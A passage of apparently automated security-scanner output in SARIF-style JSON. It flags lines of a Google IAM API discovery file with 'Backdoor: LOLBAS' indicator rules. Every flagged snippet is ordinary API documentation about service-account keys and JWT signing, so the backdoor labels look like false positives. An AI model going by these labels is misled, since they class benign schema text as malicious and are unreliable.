                      "markdown": "`of these key-pairs,\\nand Google retains ONLY the public key.\\n\\nSystem-managed key-pairs are managed automatically by Google, and rotated\\ndaily without user intervention.  The private key never leaves Google's\\nservers to maximize security.\\n\\nPublic keys for all service accounts are also published at the OAuth2\\nService Account API.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"description\": \"The resource name of the service account key in the following format\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\",\n          \"type\": \"string\"\n        },\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 45,
                  "endLine": 10,
                  "endColumn": 54,
                  "snippet": {
                    "text": "  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Identity and Access Management (IAM) API\",\n  \"description\": \"Manages identity and access control for Google Cloud Platform resources, including the creation of service accounts, which you can use to authenticate to Google and make API calls.\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n",
                    "rendered": {
                      "text": "  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Identity and Access Management (IAM) API\",\n  \"description\": \"Manages identity and access control for Google Cloud Platform resources, including the creation of service accounts, which you can use to authenticate to Google and make API calls.\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n",
                      "markdown": "`  \"version\": \"v1\",\n  \"revision\": \"0\",\n  \"title\": \"Google Identity and Access Management (IAM) API\",\n  \"description\": \"Manages identity and access control for Google Cloud Platform resources, including the creation of service accounts, which you can use to authenticate to Google and make API calls.\",\n  \"ownerDomain\": \"google.com\",\n  \"ownerName\": \"Google\",\n  \"icons\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1153,
                  "startColumn": 329,
                  "endLine": 1153,
                  "endColumn": 338,
                  "snippet": {
                    "text": "ption\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*\\/keys\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    }\n                  },\n                  \"parameterOrd",
                    "rendered": {
                      "text": "ption\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*\\/keys\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    }\n                  },\n                  \"parameterOrd",
                      "markdown": "`ption\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*\\/keys\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    }\n                  },\n                  \"parameterOrd`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1153,
                  "startColumn": 62,
                  "endLine": 1153,
                  "endColumn": 71,
                  "snippet": {
                    "text": "s/{projectsId}/serviceAccounts/{serviceAccountsId}/keys/{keysId}\",\n                  \"httpMethod\": \"DELETE\",\n                  \"description\": \"Deletes a ServiceAccountKey.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      ",
                    "rendered": {
                      "text": "s/{projectsId}/serviceAccounts/{serviceAccountsId}/keys/{keysId}\",\n                  \"httpMethod\": \"DELETE\",\n                  \"description\": \"Deletes a ServiceAccountKey.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      ",
                      "markdown": "`s/{projectsId}/serviceAccounts/{serviceAccountsId}/keys/{keysId}\",\n                  \"httpMethod\": \"DELETE\",\n                  \"description\": \"Deletes a ServiceAccountKey.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1125,
                  "startColumn": 312,
                  "endLine": 1125,
                  "endColumn": 321,
                  "snippet": {
                    "text": "          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    }\n                  },\n                  \"parameterOrder\": [\n       ",
                    "rendered": {
                      "text": "          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    }\n                  },\n                  \"parameterOrder\": [\n       ",
                      "markdown": "`          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    }\n                  },\n                  \"parameterOrder\": [\n       `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1125,
                  "startColumn": 62,
                  "endLine": 1125,
                  "endColumn": 71,
                  "snippet": {
                    "text": "ojectsId}/serviceAccounts/{serviceAccountsId}/keys\",\n                  \"httpMethod\": \"POST\",\n                  \"description\": \"Creates a ServiceAccountKey\\nand returns it.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path",
                    "rendered": {
                      "text": "ojectsId}/serviceAccounts/{serviceAccountsId}/keys\",\n                  \"httpMethod\": \"POST\",\n                  \"description\": \"Creates a ServiceAccountKey\\nand returns it.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path",
                      "markdown": "`ojectsId}/serviceAccounts/{serviceAccountsId}/keys\",\n                  \"httpMethod\": \"POST\",\n                  \"description\": \"Creates a ServiceAccountKey\\nand returns it.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1090,
                  "startColumn": 331,
                  "endLine": 1090,
                  "endColumn": 340,
                  "snippet": {
                    "text": "ion\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\n\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*\\/keys\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    },\n                    \"publicKeyType\": {\n            ",
                    "rendered": {
                      "text": "ion\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\n\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*\\/keys\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    },\n                    \"publicKeyType\": {\n            ",
                      "markdown": "`ion\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\n\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*\\/keys\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    },\n                    \"publicKeyType\": {\n            `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1090,
                  "startColumn": 62,
                  "endLine": 1090,
                  "endColumn": 71,
                  "snippet": {
                    "text": "ectsId}/serviceAccounts/{serviceAccountsId}/keys/{keysId}\",\n                  \"httpMethod\": \"GET\",\n                  \"description\": \"Gets the ServiceAccountKey\\nby key id.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\n\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                    ",
                    "rendered": {
                      "text": "ectsId}/serviceAccounts/{serviceAccountsId}/keys/{keysId}\",\n                  \"httpMethod\": \"GET\",\n                  \"description\": \"Gets the ServiceAccountKey\\nby key id.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\n\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                    ",
                      "markdown": "`ectsId}/serviceAccounts/{serviceAccountsId}/keys/{keysId}\",\n                  \"httpMethod\": \"GET\",\n                  \"description\": \"Gets the ServiceAccountKey\\nby key id.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account key in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}\\/keys\\/{key}`.\\n\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                    `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1054,
                  "startColumn": 315,
                  "endLine": 1054,
                  "endColumn": 324,
                  "snippet": {
                    "text": "       \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nUsing `-` as a wildcard for the project, will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    },\n                    \"keyTypes\": {\n                      \"descript",
                    "rendered": {
                      "text": "       \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nUsing `-` as a wildcard for the project, will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    },\n                    \"keyTypes\": {\n                      \"descript",
                      "markdown": "`       \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nUsing `-` as a wildcard for the project, will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"path\",\n                      \"required\": true,\n                      \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                      \"type\": \"string\"\n                    },\n                    \"keyTypes\": {\n                      \"descript`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 1054,
                  "startColumn": 62,
                  "endLine": 1054,
                  "endColumn": 71,
                  "snippet": {
                    "text": "h\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}/keys\",\n                  \"httpMethod\": \"GET\",\n                  \"description\": \"Lists ServiceAccountKeys.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nUsing `-` as a wildcard for the project, will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"p",
                    "rendered": {
                      "text": "h\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}/keys\",\n                  \"httpMethod\": \"GET\",\n                  \"description\": \"Lists ServiceAccountKeys.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nUsing `-` as a wildcard for the project, will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"p",
                      "markdown": "`h\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}/keys\",\n                  \"httpMethod\": \"GET\",\n                  \"description\": \"Lists ServiceAccountKeys.\",\n                  \"parameters\": {\n                    \"name\": {\n                      \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\n\\nUsing `-` as a wildcard for the project, will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                      \"location\": \"p`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 934,
                  "startColumn": 308,
                  "endLine": 934,
                  "endColumn": 317,
                  "snippet": {
                    "text": "          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": \"string\"\n                }\n              },\n              \"parameterOrder\": [\n                \"name\"\n            ",
                    "rendered": {
                      "text": "          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": \"string\"\n                }\n              },\n              \"parameterOrder\": [\n                \"name\"\n            ",
                      "markdown": "`          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": \"string\"\n                }\n              },\n              \"parameterOrder\": [\n                \"name\"\n            `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 934,
                  "startColumn": 58,
                  "endLine": 934,
                  "endColumn": 67,
                  "snippet": {
                    "text": "(expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n ",
                    "rendered": {
                      "text": "(expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n ",
                      "markdown": "`(expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 931,
                  "startColumn": 119,
                  "endLine": 931,
                  "endColumn": 125,
                  "snippet": {
                    "text": "\",\n              \"path\": \"v1/{+name}:signJwt\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signJwt\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a JWT using a service account's system-managed private key.\\n\\nIf no `exp` (expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service accou",
                    "rendered": {
                      "text": "\",\n              \"path\": \"v1/{+name}:signJwt\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signJwt\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a JWT using a service account's system-managed private key.\\n\\nIf no `exp` (expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service accou",
                      "markdown": "`\",\n              \"path\": \"v1/{+name}:signJwt\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signJwt\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a JWT using a service account's system-managed private key.\\n\\nIf no `exp` (expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n                  \"description\": \"The resource name of the service accou`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 931,
                  "startColumn": 49,
                  "endLine": 931,
                  "endColumn": 58,
                  "snippet": {
                    "text": "\"signJwt\": {\n              \"id\": \"iam.projects.serviceAccounts.signJwt\",\n              \"path\": \"v1/{+name}:signJwt\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signJwt\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a JWT using a service account's system-managed private key.\\n\\nIf no `exp` (expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n     ",
                    "rendered": {
                      "text": "\"signJwt\": {\n              \"id\": \"iam.projects.serviceAccounts.signJwt\",\n              \"path\": \"v1/{+name}:signJwt\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signJwt\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a JWT using a service account's system-managed private key.\\n\\nIf no `exp` (expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n     ",
                      "markdown": "`\"signJwt\": {\n              \"id\": \"iam.projects.serviceAccounts.signJwt\",\n              \"path\": \"v1/{+name}:signJwt\",\n              \"flatPath\": \"v1/projects/{projectsId}/serviceAccounts/{serviceAccountsId}:signJwt\",\n              \"httpMethod\": \"POST\",\n              \"description\": \"Signs a JWT using a service account's system-managed private key.\\n\\nIf no `exp` (expiry) time is contained in the claims, we will\\nprovide an expiry of one hour in the future. If an expiry\\nof more than one hour in the future is requested, the request\\nwill fail.\",\n              \"parameters\": {\n                \"name\": {\n     `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
                  "startLine": 906,
                  "startColumn": 308,
                  "endLine": 906,
                  "endColumn": 317,
                  "snippet": {
                    "text": "          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": \"string\"\n                }\n              },\n              \"parameterOrder\": [\n                \"name\"\n            ",
                    "rendered": {
                      "text": "          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": \"string\"\n                }\n              },\n              \"parameterOrder\": [\n                \"name\"\n            ",
                      "markdown": "`          \"description\": \"The resource name of the service account in the following format:\\n`projects\\/{project}\\/serviceAccounts\\/{account}`.\\nUsing `-` as a wildcard for the project will infer the project from\\nthe account. The `account` value can be the `email` address or the\\n`unique_id` of the service account.\",\n                  \"location\": \"path\",\n                  \"required\": true,\n                  \"pattern\": \"^projects\\/[^\\/]*\\/serviceAccounts\\/[^\\/]*$\",\n                  \"type\": \"string\"\n                }\n              },\n              \"parameterOrder\": [\n                \"name\"\n            `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1.json"
                },
                "region": {
